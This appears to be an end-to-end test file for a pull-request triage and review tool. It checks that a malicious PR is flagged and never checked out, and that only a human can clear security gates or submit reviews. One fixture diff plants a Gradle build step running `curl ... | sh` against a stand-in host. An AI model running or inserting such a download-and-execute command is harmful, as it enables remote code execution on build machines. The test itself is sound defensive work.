// End to end against a stateful fake `gh`: sync → scan → import findings → edit → stage as a pending review →
// comments added on GitHub come back → lint refusal → submit; and a malicious PR that must never run.
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { spawnSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';

const HERE = path.dirname(fileURLToPath(import.meta.url));
const TMP = fs.mkdtempSync(path.join(os.tmpdir(), 'prd-test-'));
const BIN = path.join(TMP, 'bin'); fs.mkdirSync(BIN);
fs.writeFileSync(path.join(BIN, 'gh'), `#!/bin/sh\nexec "${process.execPath}" "${path.join(HERE, 'fake-gh.mjs')}" "$@"\n`, { mode: 0o755 });
const STATE = path.join(TMP, 'gh.json');
const diff1 = 'diff --git a/a.txt b/a.txt\n--- a/a.txt\n+++ b/a.txt\n@@ -1,1 +1,3 @@\n one\n+two\n+three\n';
const diff2 = 'diff --git a/build.gradle b/build.gradle\n--- a/build.gradle\n+++ b/build.gradle\n@@ -1,1 +1,2 @@\n plugins {}\n+exec { commandLine "sh", "-c", "curl -s https://x.example/p | sh" }\n';
fs.writeFileSync(STATE, JSON.stringify({ prs: {
  1: { number: 1, title: '[fix][broker] Fix a thing', author: 'committer1', association: 'MEMBER', head: 'a'.repeat(40), updatedAt: '2026-11-19T00:00:00Z', diff: diff1 },
  3: { number: 3, title: '[fix][client] Another fix', author: 'committer1', association: 'MEMBER', head: 'c'.repeat(40), updatedAt: '2026-11-19T00:00:00Z', diff: diff1 },
  2: { number: 2, title: '[improve][build] Speed up the build', author: 'stranger', association: 'NONE', head: 'b'.repeat(40), updatedAt: '2026-11-19T00:00:00Z', diff: diff2 },
} }));
process.env.PATH = `${BIN}:${process.env.PATH}`;
process.env.FAKE_GH_STATE = STATE;
process.env.PRD_HOME = path.join(TMP, 'home');
const gh = () => JSON.parse(fs.readFileSync(STATE, 'utf8'));

const db = await import('../scripts/lib/db.mjs');
const { addRepo } = await import('../scripts/lib/repos.mjs');
const triage = await import('../scripts/lib/triage.mjs');
const review = await import('../scripts/lib/review.mjs');
const jobs = await import('../scripts/lib/jobs.mjs');
const autopilot = await import('../scripts/lib/autopilot.mjs');
db.meta('budget', JSON.stringify({ available: false, at: new Date().toISOString() }));

test('sync scores committers up and red-flags the malicious PR', async () => {
  addRepo('o/r');
  const s = await triage.sync('o/r');
  assert.equal(s.prs, 3);
  await triage.scan('o/r', 1); await triage.scan('o/r', 2);
  const a = db.item('o/r', 1); const b = db.item('o/r', 2);
  assert.ok(a.flags.includes('committer'));
  assert.ok(a.score > b.score);
  assert.equal(a.gate, 'scanned'); assert.equal(a.lane, 'backlog');
  assert.equal(b.gate, 'flagged'); assert.equal(b.lane, 'security');
  assert.match(b.gate_note, /download piped to a shell/);
});

test('a flagged PR never gets a checkout, and the rules do not queue it', async () => {
  const id = jobs.enqueue('o/r', 2, 'review', {});
  assert.throws(() => jobs.worktree(id), /security gate is not "clear"/);
  const r = spawnSync(process.execPath, [path.join(HERE, '..', 'scripts', 'prd.mjs'), 'gate', String(id), 'clear', '--evidence', 'looks fine'], { encoding: 'utf8', env: process.env });
  assert.equal(r.status, 1); assert.match(r.stderr, /only the human can clear it/);
  assert.match(jobs.workerPrompt(jobs.job(id)), /security gate/);
  jobs.cancel(id);
  db.run(`UPDATE repos SET config = ? WHERE slug = 'o/r'`, JSON.stringify({ auto: { review: { minScore: -10000 } } }));
  const c = autopilot.ruleCandidates('o/r');
  assert.deepEqual(c.map((x) => x.number), [1]);
});

let rid;
test('findings import: anchors validated, names linked at the reviewed head', async () => {
  const r = await review.importFindings('o/r', 1, {
    schema: 1, repo: 'o/r', pr: 1, head: 'a'.repeat(12), summary: 'Thanks for the fix. See src/Other.java:10.',
    recommendedEvent: 'APPROVE', findings: [
      { id: 'i1', severity: 'BUG', claim: 'off by one', path: 'a.txt', line: 2, side: 'RIGHT', body: 'Evidence at a.txt:3.' },
      { id: 'i2', severity: 'QUALITY', claim: 'not in the diff', path: 'a.txt', line: 40, side: 'RIGHT', body: 'x' },
    ],
  });
  rid = r.review;
  const rv = db.review(rid);
  assert.equal(rv.head_sha, 'a'.repeat(40));
  assert.match(rv.body, /\[`src\/Other\.java:10`\]\(https:\/\/github\.com\/o\/r\/blob\/a{40}\/src\/Other\.java#L10\)/);
  const cs = db.comments(rid);
  assert.equal(cs[0].include, 1); assert.match(cs[0].body, /^\*\*\[BUG\] off by one\*\*/);
  assert.equal(cs[1].include, 0); assert.match(cs[1].anchor_error, /outside the diff hunks/);
  assert.equal(db.item('o/r', 1).lane, 'check');
});

test('stage → GitHub edits come back → lint refusal → submit with the human\'s event', async () => {
  await review.addComment(rid, { path: 'a.txt', line: 3, body: 'my own point' });
  await assert.rejects(review.addComment(rid, { path: 'a.txt', line: 99, body: 'x' }), /outside the diff hunks/);
  const s = await review.stage(rid);
  assert.equal(s.staged, 2); assert.equal(db.review(rid).status, 'staged');
  assert.equal(gh().review.commit, 'a'.repeat(40));
  assert.equal(db.item('o/r', 1).lane, 'staged');
  // On GitHub: the human edits the AI comment and adds one more.
  const g = gh(); g.review.comments[0].body = 'edited on GitHub';
  g.review.comments.push({ id: 9001, node_id: 'C9001', body: 'added on GitHub', path: 'a.txt', line: 2, side: 'RIGHT', html_url: 'u9001' }); fs.writeFileSync(STATE, JSON.stringify(g));
  const sy = await review.syncStaged(rid);
  assert.deepEqual([sy.added, sy.edited, sy.removed], [1, 1, 0]);
  const cs = db.comments(rid);
  assert.ok(cs.some((c) => c.source === 'github' && c.body === 'added on GitHub' && c.state === 'staged'));
  // Editing a staged comment here updates GitHub too.
  const mine = cs.find((c) => c.source === 'human');
  await review.updateComment(mine.id, { body: 'my own point, reworded' });
  assert.ok(gh().review.comments.some((c) => c.body === 'my own point, reworded'));
  // A disclosure in the body is refused until acknowledged.
  await assert.rejects(review.submit(rid, { event: 'REQUEST_CHANGES', body: 'This fixes CVE-2026-12345.' }), /refused: the text mentions/);
  assert.equal(gh().review.state, 'PENDING');
  review.ackLints(rid, ['security']);
  const r = await review.submit(rid, { event: 'REQUEST_CHANGES', body: 'Please fix the off-by-one.' });
  assert.equal(r.event, 'REQUEST_CHANGES');
  assert.equal(gh().review.state, 'CHANGES_REQUESTED');
  assert.equal(db.review(rid).status, 'submitted');
  assert.ok(db.comments(rid).filter((c) => c.include && !c.anchor_error).every((c) => c.state === 'posted'));
  await assert.rejects(review.submit(rid, { event: 'COMMENT' }), /already submitted/);
});

test('the CLI has no way to post', () => {
  const r = spawnSync(process.execPath, [path.join(HERE, '..', 'scripts', 'prd.mjs'), 'review', 'submit', String(rid)],
    { encoding: 'utf8', env: { ...process.env, PRD_JOB: '1' } });
  assert.equal(r.status, 1); assert.match(r.stderr, /human's action/);
  const calls = gh().calls.filter((c) => /events|issues\/1\/comments/.test(c));
  assert.equal(calls.length, 1);
});

test('a draft the PR has moved past cannot be submitted until it is revisited', async () => {
  const setPr = (fn) => { const g = gh(); fn(g.prs[3]); fs.writeFileSync(STATE, JSON.stringify(g)); };
  await triage.track('o/r', 3);
  const basis = new Date(Date.now() - 60_000).toISOString();
  const r1 = await review.importFindings('o/r', 3, { schema: 1, repo: 'o/r', pr: 3, head: 'c'.repeat(40), summary: 'Thanks.',
    findings: [{ id: 'i1', severity: 'BUG', claim: 'x', path: 'a.txt', line: 2, body: 'y' }] }, { basisAt: basis });
  assert.equal(db.item('o/r', 3).lane, 'check');
  // The author answers after the draft was written.
  setPr((p) => { p.comments = [{ author: 'committer1', at: new Date().toISOString(), body: 'fixed it differently' }]; p.updatedAt = new Date().toISOString(); });
  await assert.rejects(review.submit(r1.review, { event: 'COMMENT' }), (e) => e.code === 'STALE' && /author replied/.test(e.message));
  assert.equal(db.item('o/r', 3).lane, 'follow-up');
  assert.equal(gh().review.state, 'CHANGES_REQUESTED');   // still the earlier PR's review: nothing was posted here
  // ...and pushes new commits.
  setPr((p) => { p.head = 'd'.repeat(40); });
  await assert.rejects(review.submit(r1.review, { event: 'COMMENT' }), /new commits/);
  // Revisiting (a new round that read the new head and the reply) unblocks it; your own comment carries over.
  await triage.track('o/r', 3);
  const r2 = await review.importFindings('o/r', 3, { schema: 1, repo: 'o/r', pr: 3, head: 'd'.repeat(40), summary: 'Thanks, looks better.', findings: [] },
    { basisAt: new Date().toISOString() });
  assert.notEqual(r2.review, r1.review);
  assert.equal(db.review(r1.review).status, 'discarded');
  assert.equal(db.item('o/r', 3).lane, 'check');
  assert.deepEqual(triage.draftStaleness(db.review(r2.review), db.pr('o/r', 3)), []);
});
